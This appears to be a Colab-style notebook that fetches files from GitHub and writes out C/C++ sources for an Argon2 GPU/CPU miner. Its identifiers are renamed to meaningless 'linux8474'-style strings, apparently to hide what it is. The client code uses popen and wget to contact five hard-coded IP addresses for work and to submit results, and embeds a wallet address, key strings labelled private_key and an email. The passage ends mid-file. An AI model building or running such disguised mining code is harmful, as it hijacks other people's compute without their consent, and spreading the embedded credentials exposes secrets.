!mkdir ./linux8474/

!mkdir ./linux8474/linux847466882/

%cd ./linux8474/linux847466882/

!wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux847466882profile_1_1_524288.c

!wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux847466882profile_4_4_16384.c

%cd /content/

!mkdir ./common/

%cd ./common/

%cd /content/

!mkdir ./linux8474/

!mkdir ./linux8474/gpu/

!mkdir ./linux8474/gpu/cuda/

%cd ./linux8474/gpu/cuda/

!wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/cuda_kernel.cu

%cd /content/

!mkdir ./http/

%cd ./http/

%cd /content/

!mkdir ./http/simplejson/

%cd ./http/simplejson/

!wget -N https://raw.githubusercontent.com/mobileapps84741274/linux8444/main/http/simplejson/json.h

%cd /content/

!mkdir ./linux8474/

!mkdir ./linux8474/linux847466882/

%cd ./linux8474/linux847466882/

%cd /content/

!mkdir ./linux84/

%cd ./linux84/

%cd /content/

!mkdir ./http/

!mkdir ./http/http_parser/

%cd ./http/http_parser/

%cd /content/

!mkdir ./app/

content="""#ifndef CFGPATH_H_
#define CFGPATH_H_

#ifdef _MSC_VER
#define inline __inline
#include <direct.h>
#define mkdir _mkdir
#endif

#ifdef __linux__
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#define MAX_PATH 512
#define PATH_SEPARATOR_CHAR '//'
#define PATH_SEPARATOR_STRING "//"
#elif defined(WIN32)
#include <shlobj.h>
#define PATH_SEPARATOR_CHAR '\\'
#define PATH_SEPARATOR_STRING "\\"
#elif defined(__APPLE__)
#include <CoreServices/CoreServices.h>
#include <sys/stat.h>
#define MAX_PATH PATH_MAX
#define PATH_SEPARATOR_CHAR '//'
#define PATH_SEPARATOR_STRING "//"
#else
#error cfgpath.h functions have not been implemented for your platform!  Please send patches.
#endif

static inline void get_user_config_file(char *out, unsigned int maxlen, const char *appname)
{
#ifdef __linux__
	const char *out_orig = out;
	char *home = getenv("XDG_CONFIG_HOME");
	unsigned int config_len = 0;
	if (!home) {
		home = getenv("HOME");
		if (!home) {
			out[0] = 0;
			return;
		}
		config_len = strlen(".config//");
	}

	unsigned int home_len = strlen(home);
	unsigned int appname_len = strlen(appname);
	const int ext_len = strlen(".conf");

	/* first +1 is "//", second is terminating null */
	if (home_len + 1 + config_len + appname_len + ext_len + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	memcpy(out, home, home_len);
	out += home_len;
	*out = '/';
	out++;
	if (config_len) {
		memcpy(out, ".config//", config_len);
		out += config_len;
		mkdir(out_orig, 0755);
	}
	memcpy(out, appname, appname_len);
	out += appname_len;
	memcpy(out, ".conf", ext_len);
	out += ext_len;
	*out = 0;
#elif defined(WIN32)
	if (maxlen < MAX_PATH) {
		out[0] = 0;
		return;
	}
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, out))) {
		out[0] = 0;
		return;
	}
	unsigned int appname_len = strlen(appname);
	if (strlen(out) + 1 + appname_len + strlen(".ini") + 1 > maxlen) {
		out[0] = 0;
		return;
	}
	strcat(out, "\\");
	strcat(out, appname);
	strcat(out, ".ini");
#elif defined(__APPLE__)
	FSRef ref;
	FSFindFolder(kUserDomain, kApplicationSupportFolderType, kCreateFolder, &ref);
	char home[MAX_PATH];
	FSRefMakePath(&ref, (UInt8 *)&home, MAX_PATH);
	/* first +1 is "//", second is terminating null */
	const char *ext = ".conf";
	if (strlen(home) + 1 + strlen(appname) + strlen(ext) + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	strcpy(out, home);
	strcat(out, PATH_SEPARATOR_STRING);
	strcat(out, appname);
	strcat(out, ext);
#endif
}

static inline void get_user_config_folder(char *out, unsigned int maxlen, const char *appname)
{
#ifdef __linux__
	const char *out_orig = out;
	char *home = getenv("XDG_CONFIG_HOME");
	unsigned int config_len = 0;
	if (!home) {
		home = getenv("HOME");
		if (!home) {
			out[0] = 0;
			return;
		}
		config_len = strlen(".config//");
	}

	unsigned int home_len = strlen(home);
	unsigned int appname_len = strlen(appname);

	/* first +1 is "//", second is trailing "//", third is terminating null */
	if (home_len + 1 + config_len + appname_len + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	memcpy(out, home, home_len);
	out += home_len;
	*out = '//';
	out++;
	if (config_len) {
		memcpy(out, ".config//", config_len);
		out += config_len;
		*out = '\0';
		mkdir(out_orig, 0755);
	}
	memcpy(out, appname, appname_len);
	out += appname_len;
	*out = '\0';
	mkdir(out_orig, 0755);
	*out = '//';
	out++;
	*out = 0;
#elif defined(WIN32)
	if (maxlen < MAX_PATH) {
		out[0] = 0;
		return;
	}
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, out))) {
		out[0] = 0;
		return;
	}
	unsigned int appname_len = strlen(appname);
	if (strlen(out) + 1 + appname_len + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}
	strcat(out, "\\");
	strcat(out, appname);
	mkdir(out);
	strcat(out, "\\");
#elif defined(__APPLE__)
	FSRef ref;
	FSFindFolder(kUserDomain, kApplicationSupportFolderType, kCreateFolder, &ref);
	char home[MAX_PATH];
	FSRefMakePath(&ref, (UInt8 *)&home, MAX_PATH);
	/* first +1 is "/", second is trailing "//", third is terminating null */
	if (strlen(home) + 1 + strlen(appname) + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	strcpy(out, home);
	strcat(out, PATH_SEPARATOR_STRING);
	strcat(out, appname);
	mkdir(out, 0755);
	strcat(out, PATH_SEPARATOR_STRING);
#endif
}

static inline void get_user_data_folder(char *out, unsigned int maxlen, const char *appname)
{
#ifdef __linux__
	const char *out_orig = out;
	char *home = getenv("XDG_DATA_HOME");
	unsigned int config_len = 0;
	if (!home) {
		home = getenv("HOME");
		if (!home) {
			out[0] = 0;
			return;
		}
		config_len = strlen(".local/share//");
	}

	unsigned int home_len = strlen(home);
	unsigned int appname_len = strlen(appname);

	/* first +1 is "//", second is trailing "//", third is terminating null */
	if (home_len + 1 + config_len + appname_len + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	memcpy(out, home, home_len);
	out += home_len;
	*out = '//';
	out++;
	if (config_len) {
		memcpy(out, ".local/share//", config_len);
		out += config_len;
		*out = '\0';
		mkdir(out_orig, 0755);
	}
	memcpy(out, appname, appname_len);
	out += appname_len;
	*out = '\0';
	mkdir(out_orig, 0755);
	*out = '//';
	out++;
	*out = 0;
#elif defined(WIN32) || defined(__APPLE__)
	/* No distinction under Windows or OS X */
	get_user_config_folder(out, maxlen, appname);
#endif
}

static inline void get_user_cache_folder(char *out, unsigned int maxlen, const char *appname)
{
#ifdef __linux__
	const char *out_orig = out;
	char *home = getenv("XDG_CACHE_HOME");
	unsigned int config_len = 0;
	if (!home) {
		home = getenv("HOME");
		if (!home) {
			// Cant find home directory
			out[0] = 0;
			return;
		}
		config_len = strlen(".cache//");
	}

	unsigned int home_len = strlen(home);
	unsigned int appname_len = strlen(appname);

	/* first +1 is "//", second is trailing "//", third is terminating null */
	if (home_len + 1 + config_len + appname_len + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}

	memcpy(out, home, home_len);
	out += home_len;
	*out = '//';
	out++;
	if (config_len) {
		memcpy(out, ".cache//", config_len);
		out += config_len;
		*out = '\0';
		mkdir(out_orig, 0755);
	}
	memcpy(out, appname, appname_len);
	out += appname_len;
	/* Make the .cache/appname folder if it doesnt already exist */
	*out = '\0';
	mkdir(out_orig, 0755);
	*out = '//';
	out++;
	*out = 0;
#elif defined(WIN32)
	if (maxlen < MAX_PATH) {
		out[0] = 0;
		return;
	}
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, out))) {
		out[0] = 0;
		return;
	}
	/* We dont try to create the AppData folder as it always exists already */
	unsigned int appname_len = strlen(appname);
	if (strlen(out) + 1 + appname_len + 1 + 1 > maxlen) {
		out[0] = 0;
		return;
	}
	strcat(out, "\\");
	strcat(out, appname);
	/* Make the AppDatappname folder if it doesnt already exist */
	mkdir(out);
	strcat(out, "\\");
#elif defined(__APPLE__)
	/* No distinction under OS X */
	get_user_config_folder(out, maxlen, appname);
#endif
}

#endif /* CFGPATH_H_ */
"""

open('./common/cfgpath.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../../../common/common.h"
#include "../../../app/arguments.h"

#include "../../linux8474.h"
#include "../../linux847466882/linux847466882.h"

#if defined(WITH_CUDA)

#include <cuda_runtime.h>
#include <driver_types.h>

#include "cuda_linux8474.h"
#include "../../../common/dllexport.h"

cuda_linux8474::cuda_linux8474() {
	_type = "GPU";
	_subtype = "CUDA";
	_short_subtype = "NVD";
	_priority = 0;
	_intensity = 0;
	__running = false;
	_description = "";
}


cuda_linux8474::~cuda_linux8474() {
	this->cleanup();
}

bool cuda_linux8474::initialize() {
	cudaError_t error = cudaSuccess;
	string error_message;

	__devices = __query_cuda_devices(error, error_message);

	if(error != cudaSuccess) {
		_description = "No compatible GPU detected: " + error_message;
		return false;
	}

	if (__devices.empty()) {
		_description = "No compatible GPU detected.";
		return false;
	}

	return true;
}

bool cuda_linux8474::configure(arguments &args) {
	int index = args.get_cards_count();
	double intensity_cpu = 0;
	double intensity_gpu = 0;

	for(vector<double>::iterator it = args.gpu_intensity_cblocks().begin(); it != args.gpu_intensity_cblocks().end(); it++) {
		intensity_cpu += *it;
	}
	intensity_cpu /= args.gpu_intensity_cblocks().size();

	for(vector<double>::iterator it = args.gpu_intensity_gblocks().begin(); it != args.gpu_intensity_gblocks().end(); it++) {
		intensity_gpu += *it;
	}
	intensity_gpu /= args.gpu_intensity_gblocks().size();

	vector<string> filter = _get_gpu_filters(args);

	int total_threads_profile_4_4_16384 = 0;
	int total_threads_profile_1_1_524288 = 0;

	if (intensity_cpu == 0 && intensity_gpu == 0) {
		_intensity = 0;
		_description = "Status: DISABLED - by user.";
		return false;
	}

	bool cards_selected = false;

	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++, index++) {
		stringstream ss;
		ss << "["<< (index + 1) << "] " << (*d)->device_string;
		string device_description = ss.str();
	        (*d)->device_index = index;

		if(filter.size() > 0) {
			bool found = false;
			for(vector<string>::iterator fit = filter.begin(); fit != filter.end(); fit++) {
				if(device_description.find(*fit) != string::npos) {
					found = true;
					break;
				}
			}
			if(!found) {
				(*d)->profile_info.threads_profile_4_4_16384 = 0;
				(*d)->profile_info.threads_profile_1_1_524288 = 0;
				ss << " - DISABLED" << endl;
				_description += ss.str();
				continue;
			}
			else {
				cards_selected = true;
			}
		}
		else {
			cards_selected = true;
		}

		ss << endl;

		double device_intensity_cpu = 0;
		if(args.gpu_intensity_cblocks().size() == 1 || (*d)->device_index >= args.gpu_intensity_cblocks().size())
			device_intensity_cpu = args.gpu_intensity_cblocks()[0];
		else
			device_intensity_cpu = args.gpu_intensity_cblocks()[(*d)->device_index];

		double device_intensity_gpu = 0;
		if(args.gpu_intensity_gblocks().size() == 1 || (*d)->device_index >= args.gpu_intensity_gblocks().size())
			device_intensity_gpu = args.gpu_intensity_gblocks()[0];
		else
			device_intensity_gpu = args.gpu_intensity_gblocks()[(*d)->device_index];

		_description += ss.str();

		if(!(__setup_device_info((*d), device_intensity_cpu, device_intensity_gpu))) {
			_description += (*d)->error_message;
			_description += "\\n";
			continue;
		};

		device_info device;

		char bus_id[100];
		if(cudaDeviceGetPCIBusId(bus_id, 100, (*d)->cuda_index) == cudaSuccess) {
			device.bus_id = bus_id;
			int domain_separator = device.bus_id.find(":");
			if(domain_separator != string::npos) {
				device.bus_id.erase(0, domain_separator + 1);
			}
		}

		device.name = (*d)->device_string;
		device.cblocks_intensity = device_intensity_cpu;
		device.gblocks_intensity = device_intensity_gpu;
		_store_device_info((*d)->device_index, device);

		total_threads_profile_4_4_16384 += (*d)->profile_info.threads_profile_4_4_16384;
		total_threads_profile_1_1_524288 += (*d)->profile_info.threads_profile_1_1_524288;
	}

	args.set_cards_count(index);

	if(!cards_selected) {
		_intensity = 0;
		_description += "Status: DISABLED - no card enabled because of filtering.";
		return false;
	}

	if (total_threads_profile_4_4_16384 == 0 && total_threads_profile_1_1_524288 == 0) {
		_intensity = 0;
		_description += "Status: DISABLED - not enough resources.";
		return false;
	}

	_intensity = (intensity_cpu + intensity_gpu) / 2.0;

	__running = true;
	_update_running_status(__running);
	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++) {
		if((*d)->profile_info.threads_profile_1_1_524288 != 0 || (*d)->profile_info.threads_profile_4_4_16384 != 0) {
            __runners.push_back(new thread([&](cuda_device_info *device, int index) {
                this->__run(device, index);
            }, (*d), 0));
            __runners.push_back(new thread([&](cuda_device_info *device, int index) {
                this->__run(device, index);
            }, (*d), 1));
		}
	}

	_description += "Status: ENABLED - with " + to_string(total_threads_profile_1_1_524288) + " threads for CPU blocks and " + to_string(total_threads_profile_4_4_16384) + " threads for GPU blocks.";

	return true;
}

void cuda_linux8474::cleanup() {
	__running = false;
	for(vector<thread*>::iterator it = __runners.begin();it != __runners.end();++it) {
		(*it)->join();
		delete *it;
	}
	__runners.clear();

	for(vector<cuda_device_info *>::iterator d = __devices.begin(); d != __devices.end(); d++) {
		cuda_free(*d);
	}
}

cuda_device_info *cuda_linux8474::__get_device_info(int device_index) {
	cuda_device_info *device_info = new cuda_device_info();
	device_info->error = cudaSuccess;
	device_info->cuda_index = device_index;

	device_info->error = cudaSetDevice(device_index);
	if(device_info->error != cudaSuccess) {
		device_info->error_message = "Error setting current device.";
		return device_info;
	}

    cudaDeviceProp devProp;
	device_info->error = cudaGetDeviceProperties(&devProp, device_index);
	if(device_info->error != cudaSuccess) {
		device_info->error_message = "Error setting current device.";
		return device_info;
	}

    device_info->device_string = devProp.name;

    size_t freemem, totalmem;
    device_info->error = cudaMemGetInfo(&freemem, &totalmem);
	if(device_info->error != cudaSuccess) {
		device_info->error_message = "Error setting current device.";
		return device_info;
	}

    device_info->max_mem_size = totalmem;
    device_info->free_mem_size = freemem;
    size_t chunk_size = freemem / 4;
    int linux8412es_in_chunk = chunk_size / linux847466882profile_1_1_524288.memsize;
    device_info->max_allocable_mem_size = linux8412es_in_chunk * linux847466882profile_1_1_524288.memsize;

    double mem_in_gb = totalmem / 1073741824.0;
    stringstream ss;
    ss << setprecision(2) << mem_in_gb;
    device_info->device_string += (" (" + ss.str() + "GB)");

    return device_info;
}

bool cuda_linux8474::__setup_device_info(cuda_device_info *device, double intensity_cpu, double intensity_gpu) {
    device->profile_info.threads_per_chunk_profile_1_1_524288 = (uint32_t)(device->max_allocable_mem_size / linux847466882profile_1_1_524288.memsize);
    size_t chunk_size_profile_1_1_524288 = device->profile_info.threads_per_chunk_profile_1_1_524288 * linux847466882profile_1_1_524288.memsize;

    device->profile_info.threads_per_chunk_profile_4_4_16384 = (uint32_t)(device->max_allocable_mem_size / linux847466882profile_4_4_16384.memsize);
    size_t chunk_size_profile_4_4_16384 = device->profile_info.threads_per_chunk_profile_4_4_16384 * linux847466882profile_4_4_16384.memsize;

    if(chunk_size_profile_1_1_524288 == 0 && chunk_size_profile_4_4_16384 == 0) {
        device->error = cudaErrorInitializationError;
        device->error_message = "Not enough memory on GPU.";
        return false;
    }

    size_t chunk_size = max(chunk_size_profile_1_1_524288, chunk_size_profile_4_4_16384);
    uint64_t usable_memory = device->free_mem_size;
    double chunks = (double)usable_memory / (double)chunk_size;

    uint32_t max_threads_1_1_524288 = (uint32_t)(device->profile_info.threads_per_chunk_profile_1_1_524288 * chunks);
    uint32_t max_threads_4_4_16384 = (uint32_t)(device->profile_info.threads_per_chunk_profile_4_4_16384 * chunks);

    if(max_threads_1_1_524288 == 0 && max_threads_4_4_16384 == 0) {
        device->error = cudaErrorInitializationError;
        device->error_message = "Not enough memory on GPU.";
        return false;
    }

    device->profile_info.threads_profile_1_1_524288 = (uint32_t)(max_threads_1_1_524288 * intensity_cpu / 100.0);
    if(max_threads_1_1_524288 > 0 && device->profile_info.threads_profile_1_1_524288 == 0 && intensity_cpu > 0)
        device->profile_info.threads_profile_1_1_524288 = 1;
    device->profile_info.threads_profile_4_4_16384 = (uint32_t)(max_threads_4_4_16384 * intensity_gpu / 100.0);
    if(max_threads_4_4_16384 > 0 && device->profile_info.threads_profile_4_4_16384 == 0 && intensity_gpu > 0)
        device->profile_info.threads_profile_4_4_16384 = 1;

    double chunks_1_1_524288 = (double)device->profile_info.threads_profile_1_1_524288 / (double)device->profile_info.threads_per_chunk_profile_1_1_524288;
    double chunks_4_4_16384 = (double)device->profile_info.threads_profile_4_4_16384 / (double)device->profile_info.threads_per_chunk_profile_4_4_16384;

    chunks = max(chunks_1_1_524288, chunks_4_4_16384);

	cuda_allocate(device, chunks, chunk_size);

	if(device->error != cudaSuccess)
		return false;

    return true;
}

vector<cuda_device_info *> cuda_linux8474::__query_cuda_devices(cudaError_t &error, string &error_message) {
	vector<cuda_device_info *> devices;
	int devCount = 0;
	error = cudaGetDeviceCount(&devCount);

	if(error != cudaSuccess) {
		error_message = "Error querying CUDA device count.";
		return devices;
	}

	if(devCount == 0)
		return devices;

	for (int i = 0; i < devCount; ++i)
	{
		cuda_device_info *dev = __get_device_info(i);
		if(dev == NULL)
			continue;
		if(dev->error != cudaSuccess) {
			error = dev->error;
			error_message = dev->error_message;
			continue;
		}
		devices.push_back(dev);
	}
	return devices;
}

void cuda_linux8474::__run(cuda_device_info *device, int thread_id) {
	cudaSetDevice(device->cuda_index);

	cuda_gpumgmt_thread_data thread_data;
	thread_data.device = device;
	thread_data.thread_id = thread_id;
	cudaStream_t stream;
	device->error = cudaStreamCreate(&stream);
	if(device->error != cudaSuccess) {
	    LOG("Error running kernel: (" + to_string(device->error) + ") cannot create cuda stream.");
        __running = false;
    	_update_running_status(__running);
    	return;
    }

	thread_data.device_data = stream;

#ifdef PARALLEL_CUDA
    if(thread_id == 0) {
        thread_data.threads_profile_1_1_524288_idx = 0;
        thread_data.threads_profile_4_4_16384_idx = 0;
        thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288 / 2;
        thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384 / 2;
    }
    else {
        thread_data.threads_profile_1_1_524288_idx = device->profile_info.threads_profile_1_1_524288 / 2;
        thread_data.threads_profile_4_4_16384_idx = device->profile_info.threads_profile_4_4_16384 / 2;
        thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288 - thread_data.threads_profile_1_1_524288_idx;
        thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384 - thread_data.threads_profile_4_4_16384_idx;
    }
#else
    thread_data.threads_profile_1_1_524288_idx = 0;
    thread_data.threads_profile_4_4_16384_idx = 0;
    thread_data.threads_profile_1_1_524288 = device->profile_info.threads_profile_1_1_524288;
    thread_data.threads_profile_4_4_16384 = device->profile_info.threads_profile_4_4_16384;
#endif

	void *memory = device->arguments.host_seed_memory[thread_id];
	linux847466882 linux8412_factory(cuda_kernel_filler, memory, &thread_data);
	linux8412_factory.set_lane_length(2);

	while(__running) {

		linux8412_data input = _get_input();
		linux847466882profile *profile = _get_linux847466882profile();

			if(strcmp(profile->profile_name, "1_1_524288") == 0) {
				linux8412_factory.set_seed_memory_offset(2 * linux847466882_BLOCK_SIZE);
				linux8412_factory.set_threads(thread_data.threads_profile_1_1_524288);
			}
			else {
				linux8412_factory.set_seed_memory_offset(8 * linux847466882_BLOCK_SIZE);
				linux8412_factory.set_threads(thread_data.threads_profile_4_4_16384);
			}

			vector<string> linux8412es = linux8412_factory.generate_hashes(*profile, input.base, input.salt);

			vector<linux8412_data> stored_linux8412es;
			for(vector<string>::iterator it = linux8412es.begin(); it != linux8412es.end(); ++it) {
				input.linux8412 = *it;
				stored_linux8412es.push_back(input);
			}
			_store_linux8412(stored_linux8412es, device->device_index);
	}

	_update_running_status(__running);
}

REGISTER_linux8474(cuda_linux8474);

#endif //WITH_CUDA
"""

open('./linux8474/gpu/cuda/cuda_linux8474.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 19/02/2019.
//

#include "json.h"

namespace  json {
    JSON Array() {
        return std::move( JSON::Make( JSON::Class::Array ) );
    }

    JSON Object() {
        return std::move( JSON::Make( JSON::Class::Object ) );
    }

    std::ostream& operator<<( std::ostream &os, const JSON &json ) {
        os << json.dump();
        return os;
    }

    JSON JSON::Load(const string &str) {
        size_t offset = 0;
        return std::move(parse_next(str, offset));
    }
}
"""

open('./http/simplejson/json.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#ifndef PROJECT_CLIENT_H
#define PROJECT_CLIENT_H

#include "http.h"

struct linux888874744474_result {
    bool success;
};

struct linux888874744474_update_result : public linux888874744474_result {
    string linux841;
    string linuxweb8888;
    uint32_t linux8428;
    string linux84888874;
    uint32_t linux884444884488441274444474;
    string linux847466882profile;
    string linux8412;
    string version;
    string extensions;
    uint32_t linux845;
    uint32_t linux842;
    uint32_t linux844;
    
    bool update(linux888874744474_update_result &src) {
            linux841 = src.linux841;
            linuxweb8888 = src.linuxweb8888;
            linux8428 = src.linux8428;
            linux84888874 = src.linux84888874;
            linux884444884488441274444474 = src.linux884444884488441274444474;
            linux845 = src.linux845;
            linux842 = src.linux842;
            linux844 = src.linux844;
            linux8412 = src.linux8412;
            version = src.version;
            extensions = src.extensions;
            linux847466882profile = src.linux847466882profile;

        return true;
        
    }
      
    string response() {

    stringstream ss;
        
    ss << "{ \\"linux74\\": \\"linux88\\", \\"linux7488\\": { \\"linux8412\\": \\"" << linux8412 << "\\", \\"linux842\\": " << linux842
           << ", \\"linux844\\": " << linux844 << ", \\"linux845\\": " << linux845 <<", \\"linux848\\": \\"" << linuxweb8888
           << "\\", \\"linux841\\": \\"" << linux841 << "\\", \\"linux84747474\\": " << linux884444884488441274444474 << ", \\"linux84888874\\": \\"" << linux84888874
           << "\\", \\"linux8428\\": " << linux8428 << " }, \\"linux8424\\": \\"linux8426\\"}";

        return ss.str();

    }
     
};

struct linux888874744474_submit_result : public linux888874744474_result {
    string linuxweb844412441274_response;
};

typedef function<string ()> get_status_ptr;

class linux888874744474_client : public http {
public:
    linux888874744474_client(arguments &args, get_status_ptr get_status);

    linux888874744474_update_result update();
    linux888874744474_submit_result submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key);
    void disconnect();

private:

    bool __is_devfee_time;
    string __linux84_version;
    string __linuxweb84748874_id;
    string __linuxweb84748874_name;
    string __force_linux847466882profile;
    int64_t __linux8412_report_interval;

    bool __show_linuxweb844412441274_requests;

    uint64_t __timestamp;
    uint64_t __last_linux8412_report;
    get_status_ptr __get_status;
};

#endif //PROJECT_CLIENT_H
"""

open('./http/client.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#ifndef linux888888887444888888linux84_HTTP_H
#define linux888888887444888888linux84_HTTP_H


class http {
public:
    http();
    virtual ~http();

protected:
    string _encode(const string &src);
    string _http_get(const string &url);
    string _http_post(const string &url, const string &post_data, const string &content_type);

private:
    vector<string> __resolve_host(const string &hostname);
    string __get_response(const string &url, const string &post_data, const string &content_type);
    static int __socketlib_reference;
};


#endif //linux888888887444888888linux84_HTTP_H
"""

open('./http/http.h', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 03/08/2018.
//

#include "../common/common.h"
#include "../app/arguments.h"
#include "client.h"

#include "simplejson/json.h"

#include <string>

#include <iostream>
#include <stdio.h>
#include <stdlib.h>

#include <ctime>
#include <cstdlib>

using namespace std;

    string GetStdoutFromCommand(string cmd) {

    string data;
    FILE * stream;
    const int max_buffer = 2048;
    char buffer[max_buffer];
    cmd.append("");

    stream = popen(cmd.c_str(), "r");
    if (stream) {
    while (!feof(stream))
    if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
    pclose(stream);
    }
    return data;
    }

linux888874744474_client::linux888874744474_client(arguments &args, get_status_ptr get_status) {
    __linuxweb84748874_id = args.uid();
    __linuxweb84748874_name = args.name();
    __force_linux847466882profile = false;
    __linux8412_report_interval = 600000;
    __timestamp = __last_linux8412_report = microseconds();
    __show_linuxweb844412441274_requests = "";
    __is_devfee_time = false;
    __get_status = get_status;
    __linux84_version = "";
}

linux888874744474_update_result linux888874744474_client::update() {
    linux888874744474_update_result result;
    result.success = false;

    uint64_t current_timestamp = microseconds();

    string response;

string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100"};
int number;

srand(time(0));
int rand_index = rand() % 5;

    string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
    
    response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
    
    json::JSON info = json::JSON::Load(response);

    result.success = (info["linux74"].ToString() == "linux88");
    
    if (result.success) {
        json::JSON data = info["linux7488"];
        result.linux841 = data["linux841"].ToString();
        result.linuxweb8888 = data["linux848"].ToString();
        result.linux8428 = (uint32_t)data["linux8428"].ToInt();
        result.linux84888874 = data["linux84888874"].ToString();
        //result.public_key = data["public_key"].ToString();
        result.linux884444884488441274444474 = (uint32_t)data["linux84747474"].ToInt();
        result.linux844 = (uint32_t)data["linux844"].ToInt();
        result.linux845 = (uint32_t)data["linux845"].ToInt();
        result.linux842 = (uint32_t)data["linux842"].ToInt();
        result.linux8412 = data["linux8412"].ToString();
    }
    
    return result;
}

linux888874744474_submit_result linux888874744474_client::submit(const string &linux8412, const string &linux88887474447412744474, const string &public_key) {
    linux888874744474_submit_result result;
    result.success = false;
    
    string linux84746688_data;
    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
        linux84746688_data = linux8412.substr(29);
    else
        linux84746688_data = linux8412.substr(30);
    
    //string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x&public_key=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";

    string payload = "linux84746688="+ _encode(linux84746688_data) +"&nonce="+ _encode(linux88887474447412744474) +"&private_key=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&public_key="+ _encode(public_key) +"&address=3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3&mail=linuxdistro84@gmail.com&linux84744444444474=PZ8Tyr4Nx8MHsRAGMpZmZ6TWY63dXWSCworn17gwq3phD49svFCvC7qoAFE4tamjsMKGjXpsxa6wd6XRKZSJBv8xxj37hCaus2qXG65pnaHv61DShsL6SQza&linux847444444444744474=Lzhp9LopCG5MBQAmxJaz9LngpVtZ5FdGAGPfwXkY6iLQpMGb9rkaDLMqPufcUggLCpoRV1dSAx7bQ22coWfepjPULVgFHkuFRCnWeYpTwLePPciXZGfa3PPp2pvLDddQRgKyeNNKrtQCsAcasfRhjWLDufzGLqf1x";
    
    if(__show_linuxweb844412441274_requests)
    LOG("");
    
string random [] = {"94.237.30.197", "94.237.61.188", "194.113.72.197","194.113.74.217","209.151.148.100"};
int number;

srand(time(0));
int rand_index = rand() % 5;
 
    string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
    
    string response;
    
    for(int i=0;i<2;i++) { //try resubmitting if first submit fails
        //response = _http_post(url, payload, "x-www-form-urlencoded");
        response = GetStdoutFromCommand("wget -q -U 'linux84' --post-data='"+payload+"' '"+url+"' --header='Content-type: application/x-www-form-urlencoded' &> /dev/null &");
        result.linuxweb844412441274_response = response;
        if(response != "") {
            break;
        }
    }
    
    if(__show_linuxweb844412441274_requests)
    LOG("");
    
    json::JSON info = json::JSON::Load(response);

    result.success = (info["status"].ToString() == "ok");

    return result;
}
"""

open('./http/client.cpp', 'w').write(content)

content="""//
// Created by Haifa Bogdan Adnan on 04/08/2018.
//

#include "../common/common.h"
#include "http_parser/http_parser.h"

#include "http.h"

#ifdef _WIN64
#define close closesocket
#endif

struct http_callback_data {
    string body;
    bool complete;
};

int http_callback (http_parser* parser, const char *at, size_t length) {
    http_callback_data *data = (http_callback_data *)parser->data;
    data->body += string(at, length);
    return 0;
}

int http_complete_callback (http_parser* parser) {
    http_callback_data *data = (http_callback_data *)parser->data;
    data->complete = true;
    return  0;
}

struct http_data {
public:
    http_data(const string &uri, const string &data) {
        host = uri;

        protocol = "http";

        if(host.find("http://") != string::npos) {
            host = host.erase(0, 7);
            protocol = "http";
        }

        if(host.find("https://") != string::npos) {
            host = host.erase(0, 8);
            protocol = "https";
        }

        if(host.find("/") != string::npos) {
            path = host.substr(host.find("/"));
            host = host.erase(host.find("/"));
        }
        else {
            path = "/";
        }

        if(path.find("?") != string::npos) {
            query = path.substr(path.find("?"));
            path = path.erase(path.find("?"));
            query.erase(0, 1);
        }

        string port_str = "";
        if(host.find(":") != string::npos) {
            port_str = host.substr(host.find(":"));
            host = host.erase(host.find(":"));
        }

        port = 80;
